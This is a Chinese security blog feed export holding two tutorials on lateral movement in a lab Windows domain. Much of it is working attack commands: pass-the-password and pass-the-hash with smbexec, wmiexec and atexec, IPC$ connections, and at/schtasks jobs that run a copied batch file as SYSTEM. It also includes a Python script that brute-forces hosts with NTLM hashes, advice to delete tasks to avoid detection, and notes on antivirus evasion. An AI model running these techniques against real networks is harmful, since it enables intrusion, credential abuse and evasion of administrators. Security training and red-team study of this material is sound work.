src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/image-20220628115838950.png" alt="image-20220628115838950"></p><h3 id="0x04-smbexec明文传递"><a href="#0x04-smbexec明文传递" class="headerlink" title="0x04 smbexec明文传递"></a>0x04 smbexec明文传递</h3><p><strong>无需建立ipc连接</strong></p><p>1、连接域用户：</p><p>执行命令：</p><pre class="line-numbers language-none"><code class="language-none">smbexec test&#x2F;administrator:Hacker123@192.168.3.21 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/image-20220628153143073.png" alt="image-20220628153143073"></p><p>拿到目标地址shell返回system权限。</p><p>2、连接本地用户：</p><pre class="line-numbers language-none"><code class="language-none">smbexec .&#x2F;administrator:Hacker123@192.168.3.32<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/image-20220628153542606.png" alt="image-20220628153542606"></p><blockquote><p>注意：</p><p>smbexec test&#x2F;administrator:<a href="mailto:&#x48;&#x61;&#99;&#107;&#x65;&#x72;&#49;&#50;&#x33;&#64;&#49;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#46;&#x33;&#46;&#x32;&#49;">&#x48;&#x61;&#99;&#107;&#x65;&#x72;&#49;&#50;&#x33;&#64;&#49;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#46;&#x33;&#46;&#x32;&#49;</a> #这条命令是连接的test域内administrator用户；域内若是没有所连接的用户就会连接失败。</p><p>smbexec .&#x2F;administrator:<a href="mailto:&#72;&#x61;&#x63;&#x6b;&#x65;&#114;&#49;&#x32;&#51;&#64;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#56;&#46;&#51;&#x2e;&#x33;&#x32;">&#72;&#x61;&#x63;&#x6b;&#x65;&#114;&#49;&#x32;&#51;&#64;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#56;&#46;&#51;&#x2e;&#x33;&#x32;</a> #这条命令连接是连接3.32主机本地administrator用户；</p><p>用户名前面若是<code>domain/</code>则是域内用户；用户名前面若是<code>./</code>则是本地用户。</p></blockquote><h3 id="0x05-smbexec哈希-hash-传递"><a href="#0x05-smbexec哈希-hash-传递" class="headerlink" title="0x05 smbexec哈希(hash)传递"></a>0x05 smbexec哈希(hash)传递</h3><p>通过hash值连接：</p><p>执行：</p><pre class="line-numbers language-none"><code class="language-none">smbexec -hashes :9075168608b7aba2428c8387bfeb9aee test&#x2F;administrator@192.168.3.21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/image-20220628155613411.png" alt="image-20220628155613411"></p><p>执行：</p><pre class="line-numbers language-none"><code class="language-none">smbexec -hashes :9075168608b7aba2428c8387bfeb9aee .&#x2F;administrator@192.168.3.32<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/image-20220628155735220.png" alt="image-20220628155735220"></p><h2 id="0x04-WMI-服务利用-cscript-wmiexec-wmic"><a href="#0x04-WMI-服务利用-cscript-wmiexec-wmic" class="headerlink" title="0x04  WMI 服务利用-cscript-wmiexec-wmic"></a>0x04  WMI 服务利用-cscript-wmiexec-wmic</h2><h3 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h3><p><strong>WMI(Windows Management Instrumentation)</strong> 是通过 135 端口进行利用，支持用户名明文或者 hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。</p><h3 id="0x01-自带-WMIC-明文传递-无回显"><a href="#0x01-自带-WMIC-明文传递-无回显" class="headerlink" title="0x01 自带 WMIC 明文传递 无回显"></a>0x01 自带 WMIC 明文传递 无回显</h3><p><strong>优点：官方自带WMIC</strong></p><p><strong>缺点：无回显</strong></p><p>执行：</p><pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.3.21 &#x2F;user:administrator &#x2F;password:Hacker123 process call create &quot;cmd.exe &#x2F;c ipconfig &gt;C:\1.txt&quot;（连接3.21主机并执行ipconfig写如3.21主机c盘的1.txt）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/image-20220628160500786.png" alt="image-20220628160500786"></p><p>查看DC主机c盘生成了1.txt文件</p><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/image-20220628160437122.png" alt="image-20220628160437122"></p><h3 id="0x02-自带-cscript-明文传递-有回显"><a href="#0x02-自带-cscript-明文传递-有回显" class="headerlink" title="0x02 自带 cscript 明文传递 有回显"></a>0x02 自带 cscript 明文传递 有回显</h3><p><strong>优点：官方自带cscript，不会被检测，有回显</strong></p><p><strong>缺点：需要下载<code>wmiexec.vbs</code>脚本配合运行</strong></p><p>wmiexec.vbs下载地址：</p><p><a href="https://gitee.com/mirrors/K8tools/blob/master/wmiexec.vbs">https://gitee.com/mirrors/K8tools/blob/master/wmiexec.vbs</a></p><p>执行：</p><pre class="line-numbers language-none"><code class="language-none">cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.3.21 administrator Hacker123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/image-20220628161824598.png" alt="image-20220628161824598"></p><h3 id="0x03-impacket-wmiexec-明文或-hash-传递-有回显"><a href="#0x03-impacket-wmiexec-明文或-hash-传递-有回显" class="headerlink" title="0x03 impacket wmiexec 明文或 hash 传递 有回显"></a>0x03 impacket wmiexec 明文或 hash 传递 有回显</h3><p><strong>优点：有回显</strong></p><p><strong>缺点：借助impacket包，需要做免杀</strong></p><p><strong>1、明文传递：</strong></p><pre class="line-numbers language-none"><code class="language-none">wmiexec .&#x2F;administrator:Hacker123@192.168.3.32 &quot;whoami&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/image-20220628162355107.png" alt="image-20220628162355107"></p><pre class="line-numbers language-none"><code class="language-none">wmiexec test&#x2F;administrator:Hacker123@192.168.3.21 &quot;whoami&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/image-20220628162447135.png" alt="image-20220628162447135"></p><p><strong>2、hash传递：</strong></p><p>密文连接：</p><pre class="line-numbers language-none"><code class="language-none">wmiexec -hashes :9075168608b7aba2428c8387bfeb9aee .&#x2F;administrator@192.168.3.32 &quot;whoami&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/image-20220628162730954.png" alt="image-20220628162730954"></p><pre class="line-numbers language-none"><code class="language-none">wmiexec -hashes :9075168608b7aba2428c8387bfeb9aee test&#x2F;administrator@192.168.3.21 &quot;whoami&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/image-20220628162754565.png" alt="image-20220628162754565"></p><h2 id="0x05-以上服务-hash-批量利用"><a href="#0x05-以上服务-hash-批量利用" class="headerlink" title="0x05 以上服务 hash 批量利用"></a>0x05 以上服务 hash 批量利用</h2><p>批量脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>timeips<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'192.168.3.21'</span><span class="token punctuation">,</span><span class="token string">'192.168.3.25'</span><span class="token punctuation">,</span><span class="token string">'192.168.3.29'</span><span class="token punctuation">,</span><span class="token string">'192.168.3.30'</span><span class="token punctuation">,</span><span class="token string">'192.168.3.32'</span><span class="token punctuation">&#125;</span>users<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'Administrator'</span><span class="token punctuation">,</span><span class="token string">'boss'</span><span class="token punctuation">,</span><span class="token string">'dbadmin'</span><span class="token punctuation">,</span><span class="token string">'fileadmin'</span><span class="token punctuation">,</span><span class="token string">'mack'</span><span class="token punctuation">,</span><span class="token string">'mary'</span><span class="token punctuation">,</span><span class="token string">'webadmin'</span><span class="token punctuation">&#125;</span>hashs<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'9075168608b7aba2428c8387bfeb9aee'</span><span class="token punctuation">,</span><span class="token string">'9075168608b7aba2428c8387bfeb9aee'</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> ip <span class="token keyword">in</span> ips<span class="token punctuation">:</span><span class="token keyword">for</span> user <span class="token keyword">in</span> users<span class="token punctuation">:</span><span class="token keyword">for</span> mimahash <span class="token keyword">in</span> hashs<span class="token punctuation">:</span><span class="token comment">#wmiexec -hashes :hashgod/user@ipwhoami</span><span class="token keyword">exec</span> <span class="token operator">=</span> <span class="token string">"wmiexec -hashes :"</span><span class="token operator">+</span>mimahash<span class="token operator">+</span><span class="token string">" god/"</span><span class="token operator">+</span>user<span class="token operator">+</span><span class="token string">"@"</span><span class="token operator">+</span>ip<span class="token operator">+</span><span class="token string">" whoami"</span>exec1 <span class="token operator">=</span> <span class="token string">"wmiexec -hashes :"</span><span class="token operator">+</span>mimahash<span class="token operator">+</span><span class="token string">" ./"</span><span class="token operator">+</span>user<span class="token operator">+</span><span class="token string">"@"</span><span class="token operator">+</span>ip<span class="token operator">+</span><span class="token string">" whoami"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'--->'</span> <span class="token operator">+</span> <span class="token keyword">exec</span> <span class="token operator">+</span> <span class="token string">'&lt;---'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'--->'</span> <span class="token operator">+</span> exec1 <span class="token operator">+</span> <span class="token string">'&lt;---'</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>exec1<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将写好的fuck_neiwang_002.py脚本编译为pyinstaller.exe可执行的exe文件。</p><p>##0x06 总结</p><p>思路：搜集内网主机ip，相关用户，mimikatz获取密码，所在域等等需要的信息；若是明文密码获取不到，只有hash值，利用脚本编译好的exe文件批量连接获取到的主机或者用户；在这之前考虑使用官方工具还是第三方工具，若是第三方工具还需考虑需不需要做免杀</p><p><img src="/2022/06/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91/%E4%BC%A0%E9%80%92.png" alt="传递"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网安全-域横向渗透【一】</title>
      <link href="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/"/>
      <url>/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E7%8E%AF%E5%A2%83.png" alt="横向渗透-域环境"></p><h2 id="0x01-明文传递-at-amp-schtasks"><a href="#0x01-明文传递-at-amp-schtasks" class="headerlink" title="0x01 明文传递 at&amp;schtasks"></a>0x01 明文传递 at&amp;schtasks</h2><p>###0x00 思路及流程</p><p>1、在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，可以横向渗透拿下更多的主机在已知目标系统的用户明文密码的基础上， 使用at&amp;schtasks 命令，直接可以在远程主机上执行命令。</p><p>2、获取到某域主机权限-&gt;minikatz 得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表当做用户名字典-&gt;用到密码明文当做密码字典-&gt;尝试连接-&gt;创建计划任务(at|schtasks)-&gt;执行文件可为后门或者相关命令</p><h3 id="0x01-利用流程"><a href="#0x01-利用流程" class="headerlink" title="0x01 利用流程"></a>0x01 利用流程</h3><p>1、建立 IPC 链接到目标主机</p><p>2、拷贝要执行的命令脚本到目标主机</p><p>3、查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</p><p>4、删除 IPC 链接</p><h3 id="0x02-IPC"><a href="#0x02-IPC" class="headerlink" title="0x02 IPC"></a>0x02 IPC</h3><p>1、介绍：</p><p> IPC（Internet Process Connection）是共享“命名管道”，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相关的权限，在远程管路计算机和查看计算机的共享资源时使用。</p><p>2、建立 IPC 常见的错误代码</p><p>（1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限</p><p>（2）51：网络问题，Windows 无法找到网络路径</p><p>（3）53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有防火墙等问题</p><p>（4）67：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 ipc$</p><p>（5）1219：提供的凭据和已存在的凭据集冲突，说明已建立 IPC$，需要先删除</p><p>（6）1326：账号密码错误</p><p>（7）1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况</p><p>（8）2242：用户密码过期，目标有账号策略，强制定期更改密码</p><p>3、建立 IPC 失败的原因</p><p>（1）目标系统不是 NT 或2003以上的操作系统</p><p>（2）对方没有打开 IPC$共享</p><p>（3）对方未开启 139、445 端口，或者被防火墙屏蔽（139、445默认开启）</p><p>（4）输出命令、账号密码有错误</p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><blockquote><p>[at] &amp; [schtasks]命令：<br>at &lt; Windows2012（at适用于2012之前的版本）</p><p>schtasks&gt;&#x3D;Windows2012（schtasks适用于2012之后的版本）</p></blockquote><p><strong>1、使用at</strong></p><p>首先定位一个域控主机的IP地址：<br><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627094217518.png" alt="image-20220627094217518"></p><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627094309839.png" alt="image-20220627094309839"></p><p>得到域控主机IP：192.168.3.21 </p><p>查找所在域，出错了：</p><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627100705230.png" alt="image-20220627100705230"></p><blockquote><p>解决方法：</p><p>如果开了防火墙的话也是不可以执行的，先关闭防火墙。再检查以下。</p><p>1.win+R ,输入services.msc 开启服务：Server ，WorkStation，computer Browser</p><p>2.如果你的电脑没有computer Browser服务，win+R 输入appwiz.cpl ,选择启用或关闭Windows功能，选择SMB1.0&#x2F;CIFS 文件共享支持，重启电脑。然后开启以上3个服务。</p><p>3.重启computer Browser服务即可。</p></blockquote><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627100815111.png" alt="image-20220627100815111"></p><p>假设知道域控的ip地址和密码（通过minikatz获取明文、哈希密码）</p><p>通过密码和ip地址连接域控主机</p><blockquote><p>相关连接域控命令（使用ipc:命名管道）</p><p><code>net use \\server\ipc$&quot;password&quot; /user:username # 工作组</code></p><p><code>net use \\server\ipc$&quot;password&quot; /user:domain\username #域内</code></p></blockquote><p><strong>（连接之前需要扫描端口139，445是否开启）</strong></p><blockquote><p>使用命令：</p><p><code>net use \\192.168.3.21\ipc$ &quot;Hacker123&quot; /user:test\administrator</code></p></blockquote><p>使用ipc连接之后会出现已经连接到DC主机：</p><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627194504347.png" alt="image-20220627194504347"></p><p>之后在本地（webserver）c盘创建可执行文件，添加一个用户：</p><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627195816561.png" alt="image-20220627195816561"></p><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627195033563.png" alt="image-20220627195033563"></p><p>拷贝执行文件（本地c盘add.bat）到目标机器（在实战中一般都是类似msf的后门）</p><blockquote><p><code>copy add.bat \\192.168.3.21\c$</code></p></blockquote><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627195132462.png" alt="image-20220627195132462"></p><p>在域控主机DC可发现文件：</p><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627195205628.png" alt="image-20220627195205628"></p><p>最后添加计划任务（类似于Linux计划任务提权，这里的计划任务是以system执行的，是计算机的最高权限）</p><blockquote><p>执行命令：</p><p><code>at \\192.168.3.21 19:56 c:\add.bat</code></p></blockquote><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627195329452.png" alt="image-20220627195329452"></p><blockquote><p>执行命令：</p><p><code>net user</code></p></blockquote><p>在域控主机DC查看用户test是否被成功创建：</p><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627200843816.png" alt="image-20220627200843816"></p><p>2、<strong>使用schtasks</strong>（操作系统&gt;&#x3D;2012）</p><blockquote><p>建立ipc连接：<br><code>net use \\192.168.3.32\ipc$ &quot;password&quot; /user:domain\administrator</code></p><p><code>net use \\192.168.3.32\ipc$ &quot;Hacker123&quot; /user:test\administrator</code></p></blockquote><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627202648827.png" alt="image-20220627202648827"></p><p>复制文件到其 C 盘（如果拒绝访问，原因：域用户不能对本地Server 2012 SqlServer服务器进行操作）</p><blockquote><p><code>copy add.bat \\192.168.3.32\c$</code></p></blockquote><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627202728184.png" alt="image-20220627202728184"></p><p>在SqlServer本地Administrator用户C盘查看：<br><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627202806170.png" alt="image-20220627202806170"></p><blockquote><p>创建 adduser 任务对应执行文件</p><p><code>schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat /F</code></p><p>创建一个以system权限的，名为adduser的，时间为每日任务（延时执行），执行文件c:\add.bat的，计划任务</p></blockquote><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627203001828.png" alt="image-20220627203001828"></p><blockquote><p>执行命令：</p><p><code>schtasks /run /s 192.168.3.32 /tn adduser /#运行 adduser 任务</code></p><p><code>schtasks /delete /s 192.168.3.21 /tn adduser /#删除 adduser 任务</code></p><p>（删除任务是为了防止管理员发现）</p></blockquote><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627203030711.png" alt="image-20220627203030711"></p><p>最后执行net user查看成功创建用户test1：</p><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627203142301.png" alt="image-20220627203142301"></p><h2 id="0x02-明文-HASH-传递-atexec-impacket"><a href="#0x02-明文-HASH-传递-atexec-impacket" class="headerlink" title="0x02 明文 HASH 传递 atexec-impacket"></a>0x02 明文 HASH 传递 atexec-impacket</h2><h3 id="0x00-impacket介绍"><a href="#0x00-impacket介绍" class="headerlink" title="0x00 impacket介绍"></a>0x00 impacket介绍</h3><p>1、一句话命令，连接、提权全部搞定。</p><p>2、<strong>第三方工具，非微软官方工具，易被杀毒软件查杀，实战中需要做免杀。</strong></p><p>3、atexec是Impacket网络协议工具包中的一个工具。</p><p>4、Impacket工具包介绍：<a href="https://www.freebuf.com/sectool/175208.html">https://www.freebuf.com/sectool/175208.html</a></p><p>5、Impacket 是一个Python类库，用于对SMB1-3或IPv4 &#x2F; IPv6 上的TCP、UDP、ICMP、IGMP，ARP，IPv4，IPv6，SMB，MSRPC，NTLM，Kerberos，WMI，LDAP等协议进行低级编程访问。  （对协议进行访问，可以改成exe文件）</p><p>6、下载地址：<a href="https://gitee.com/RichChigga/impacket-examples-windows/repository/archive/master.zip">https://gitee.com/RichChigga/impacket-examples-windows/repository/archive/master.zip</a> </p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>尝试at命令的计划任务（2012版本以下）</p><p>连接域控本地administrator（明文）</p><pre class="line-numbers language-none"><code class="language-none">执行命令：atexec.exe .&#x2F;administrator:Hacker123@192.168.3.21 &quot;whoami&quot; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627205803678.png" alt="image-20220627205803678"></p><p>连接administrator返回system权限。</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>连接域控本地administrator（哈希）</p><p>通过mimikatz获取到域控的哈希密码：（NTLM后面是哈希值）</p><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627211959969.png" alt="image-20220627211959969"></p><pre class="line-numbers language-none"><code class="language-none">执行命令：atexec.exe -hashes :9075168608b7aba2428c8387bfeb9aee .&#x2F;administrator@192.168.3.21 &quot;whoami&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627212910913.png" alt="image-20220627212910913"></p><p>##0x03 明文 HASH 传递批量利用</p><h3 id="0x00-批量检测ip对应明文连接"><a href="#0x00-批量检测ip对应明文连接" class="headerlink" title="0x00 批量检测ip对应明文连接"></a>0x00 批量检测ip对应明文连接</h3><p>假设获取到了内网中的WebServer的权限，通过WebServer进行正常的横向渗透（实战中不知道域控密码）</p><p>首先使用mimikatz获取webserver的用户名和密码：<br><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627213532256.png" alt="image-20220627213532256"></p><p>使用微软自带命令探寻网段的存活主机（自带内部命令推荐使用）</p><p>for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”</p><blockquote><p>使用for循环，去ping,然后筛选出TTL &#x3D;的字段（发现：3.21（域控）；3.32（SQLserver）；）</p></blockquote><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627214706119.png" alt="image-20220627214706119"></p><p>将两个ip地址写入ips.txt（爆破脚本）</p><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627215019581.png" alt="image-20220627215019581"></p><p>批量检测ip对应明文连接（for循环进行变量ip地址的ipc连接）</p><pre class="line-numbers language-none"><code class="language-none">FOR &#x2F;F %i in (ips.txt) do net use \\%i\ipc$ &quot;Hacker123&quot; &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同一用户名和密码，去尝试ipc连接不同的ip地址</p><p><img src="/2022/06/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%80%E3%80%91/image-20220627220411914.png" alt="image-20220627220411914"></p><p>可以看到连接3.31成功，连接3.21提示已经被相同的用户连接。</p><p>###0x01 批量检测 IP 对应明文回显版</p><pre class="line-numbers language-none"><code class="language-none">FOR &#x2F;F %i in (ips.txt) do atexec.exe .&#x2F;administrator:Hacker123@%i whoami<span aria-hidden="true" 